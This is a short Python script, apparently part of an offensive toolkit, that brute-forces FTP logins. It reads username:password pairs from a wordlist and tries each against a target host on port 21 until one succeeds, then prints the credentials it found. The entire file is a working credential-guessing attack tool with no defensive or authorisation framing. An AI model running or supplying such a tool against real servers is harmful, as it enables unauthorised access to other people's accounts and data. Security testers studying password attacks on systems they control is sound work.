# Python Script for FTP Brute Force

# Importing modules
import ftplib, os
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

# Initializing port number
port = 21

class FTP_brute:
    def ftpbrute(hostname, username, password):
            # Initializing FTP client
            client = ftplib.FTP()

            try:
                # Connecting to FTP server
                client.connect(hostname, port, timeout=5)
                # Login using the credentials
                client.login(username, password)
            except ftplib.error_perm:
                # Incorrect credentials
                print(f"[!] Invalid credentials for {username}:{password}")
                pass
            else:
                # Connection has been established
                print(f"{GREEN}[+] Found credentials:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
                return True

    def run(hostname):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "ftp_wordlist.txt")
        credlist = open(wordlist_path).read().splitlines()

        # Start the brute force
        for cred in credlist:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if FTP_brute.ftpbrute(hostname, username, password):
                break
